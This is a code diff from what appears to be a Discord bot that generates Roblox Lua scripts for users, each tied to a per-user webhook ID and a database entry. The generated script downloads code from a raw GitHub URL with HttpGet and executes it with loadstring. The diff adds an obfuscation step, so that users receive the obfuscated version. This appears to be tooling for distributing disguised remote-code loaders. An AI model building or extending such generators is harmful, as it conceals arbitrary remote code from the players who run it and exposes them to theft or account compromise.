@@ -160,7 +160,7 @@ fenv["MinIncome"] = ${income}
 local var1 = game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde")
 local var2 = loadstring(var1)
 local var3 = var2()`;
-
+            const obfuscated = await obfuscateScript(codeToObfuscate);
             // 4. RÉPONSE EMBED POUR DEBUG
             const embed = new EmbedBuilder()
                 .setTitle("🛡️ Script Generation (Secure Mode)")
@@ -168,7 +168,7 @@ local var3 = var2()`;
                 .setColor(0x00AEFF)
                 .addFields(
                     { name: "🆔 Generated Webhook ID", value: `\`${webhookUuid}\`` },
-                    { name: "📝 Code to Obfuscate", value: `\`\`\`lua\n${codeToObfuscate}\n\`\`\`` }
+                    { name: "📝 Code to Obfuscate", value: `\`\`\`lua\n${obfuscated}\n\`\`\`` }
                 )
                 .setFooter({ text: "Database entry created successfully." });
 
